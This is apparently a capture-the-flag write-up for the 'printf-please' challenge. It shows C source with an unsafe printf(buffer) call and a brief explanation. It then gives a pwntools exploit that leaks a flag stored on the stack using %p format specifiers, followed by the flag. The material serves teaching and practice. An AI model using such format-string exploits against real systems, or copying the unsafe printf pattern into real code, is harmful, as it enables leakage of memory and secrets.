# printf-please

## Challenge

### Mitigations

```
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

### Source

```c
int main(void)
{
  char buffer[0x200];
  char flag[0x200];

  setbuf(stdout, NULL);
  setbuf(stdin, NULL);
  setbuf(stderr, NULL);

  memset(buffer, 0, sizeof(buffer));
  memset(flag, 0, sizeof(flag));

  int fd = open("flag.txt", O_RDONLY);
  if (fd == -1) {
    puts("failed to read flag. please contact an admin if this is remote");
    exit(1);
  }

  read(fd, flag, sizeof(flag));
  close(fd);

  puts("what do you say?");

  read(0, buffer, sizeof(buffer) - 1);
  buffer[strcspn(buffer, "\n")] = 0;

  if (!strncmp(buffer, "please", 6)) {
    printf(buffer);
    puts(" to you too!");
  }
}
```

## Solution

Program uses `printf` in an unsafe manner by passing it raw user input.

The flag is stored on the stack.

Using the `%p` specifier, we can leak the flag as hexadecimal qwords.

The hexadecimal numbers can be converted to strings, accounting for endianness, to get the flag.

## Exploit

```py
#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host mc.ax --port 31569 please
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('please')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'mc.ax'
port = int(args.PORT or 31569)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      PIE enabled

io = start()

io.sendline("please %70$p %71$p %72$p %73$p %74$p %75$p")
io.recvuntil("please ")
raw = io.recvuntil(" to you too!", drop=True)

flag = ""

for i in raw.split():
    if i != "(nil)":
        for j in reversed([i[2:].rjust(16, '0')[n:n+2] for n in range(0, 16, 2)]):
            if j != "00":
                flag += j.decode("hex")

print(flag)

io.interactive()
```

## Flag

`flag{pl3as3_pr1ntf_w1th_caut10n_9a3xl}`
